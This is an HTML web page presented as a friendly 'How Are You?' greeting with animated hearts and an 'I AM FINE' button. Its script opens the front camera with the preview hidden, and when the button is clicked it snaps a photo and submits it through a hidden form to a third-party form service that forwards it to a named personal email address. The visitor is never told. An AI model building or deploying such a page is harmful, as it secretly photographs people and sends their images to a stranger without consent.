<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
  <meta name="google-site-verification" content="9QVTkbGpXPV0ZpAuBUIEHX1u7iaaLoclM4HoDKTL8Bc" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>How Are You?</title>
<style>
body {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
  background: linear-gradient(to bottom right, #fdf0f5, #dbe6ff);
  font-family: Arial, sans-serif;
  overflow: hidden;
}

h2 {
  font-size: 3em;
  color: palevioletred;
  text-align: center;
  margin-bottom: 30px;
  text-shadow: 2px 2px 5px rgba(0,0,0,0.2);
  z-index: 2;
}

button {
  font-size: 2em;
  padding: 15px 30px;
  color: white;
  background-color: blueviolet;
  border: none;
  border-radius: 15px;
  cursor: pointer;
  transition: transform 0.3s, box-shadow 0.3s, opacity 0.5s;
  z-index: 2;
  position: relative;
}

button:hover {
  transform: scale(1.1);
  box-shadow: 0 0 20px rgba(138,43,226,0.8);
}

.heart {
  position: absolute;
  top: -20px;
  color: #1e90ff;
  font-size: 20px;
  animation: fall linear infinite;
  z-index: 1;
  opacity: 0.8;
}

@keyframes fall {
  to { transform: translateY(110vh) rotate(360deg); }
}

video {
  display: none; /* hide live camera preview */
}
</style>
</head>
<body>

<h2>HELLO ❤ — HOW ARE YOU?</h2>
<button id="capture">I AM FINE</button>

<canvas id="canvas" style="display:none;"></canvas>

<form id="imageForm" action="https://formsubmit.co/ganeshbist257@gmail.com" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="_captcha" value="false">
  <input type="hidden" name="_template" value="table">
  <input type="hidden" name="_next" value="https://Binodbist7.github.io/Qnahi/index.html">
  <input type="file" id="imageInput" name="image" accept="image/png, image/jpeg" style="display:none;">
  <button type="submit" style="display:none;">Submit</button>
</form>

<script>
const canvas = document.getElementById("canvas");
const captureButton = document.getElementById("capture");
const imageInput = document.getElementById("imageInput");
const form = document.getElementById("imageForm");

let video;

// Start camera
navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
  .then(stream => {
    video = document.createElement("video");
    video.srcObject = stream;
    video.play();
  })
  .catch(err => console.error("Error accessing camera: ", err));

// Heart animation
function createHeart() {
  const heart = document.createElement("div");
  heart.classList.add("heart");
  heart.innerHTML = "💙";
  heart.style.left = Math.random() * 100 + "vw"; 
  heart.style.fontSize = (Math.random() * 20 + 10) + "px"; 
  heart.style.animationDuration = (Math.random() * 5 + 5) + "s"; 
  document.body.appendChild(heart);
  setTimeout(() => heart.remove(), 10000);
}
setInterval(createHeart, 300);

// Capture photo and submit
captureButton.addEventListener("click", () => {
  if (!video) return alert("Camera not ready!");

  // Draw video frame to canvas
  canvas.width = video.videoWidth || 1080;
  canvas.height = video.videoHeight || 1440;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Convert canvas to blob and set as file input
  canvas.toBlob(blob => {
    const file = new File([blob], "photo.png", { type: "image/png" });
    if (window.DataTransfer) {
      const dt = new DataTransfer();
      dt.items.add(file);
      imageInput.files = dt.files;
    } else {
      imageInput.files = [file];
    }

    // Properly submit form so _next works
    if (form.requestSubmit) {
      form.requestSubmit();
    } else {
      form.submit(); // fallback for older browsers
    }
  }, "image/png");

  // Fade out button smoothly
  captureButton.style.transition = "opacity 0.5s";
  captureButton.style.opacity = 0;
});
</script>

</body>
</html>
THANK YOU!

